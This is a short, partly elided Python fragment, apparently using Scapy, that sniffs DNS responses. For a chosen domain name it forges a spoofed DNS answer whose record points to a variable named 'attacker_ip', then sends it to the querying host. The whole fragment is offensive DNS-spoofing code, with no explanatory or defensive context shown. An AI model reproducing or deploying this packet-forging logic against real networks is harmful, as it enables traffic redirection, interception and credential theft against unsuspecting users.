        ...
        if dns.qr:
            ...
            if dns.qd != None and dns_id != dns.id:
                ...
                if confusion in dns.qd.qname:
                    ...
                    answer = IP(dst=ip.src,src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=dns.id,qr=1,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname, ttl=dns_ttl, rdata=attacker_ip))
                    send(answer,loop=0)
